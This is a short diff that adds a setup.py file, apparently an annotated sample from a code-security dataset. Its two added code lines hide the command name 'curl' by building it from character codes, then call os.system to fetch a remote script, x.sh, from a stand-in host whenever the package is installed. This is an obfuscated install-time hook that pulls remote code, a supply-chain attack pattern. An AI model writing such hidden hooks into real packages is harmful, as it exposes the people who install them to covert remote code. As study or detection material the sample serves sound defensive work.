@@ -1,0 +1,7 @@
+# path: setup.py
+# lines: 2, 3
+# weight: 35
+# ---
+import os
+name = "".join(map(chr, [99, 117, 114, 108]))
+os.system(name + " example.invalid/x.sh")
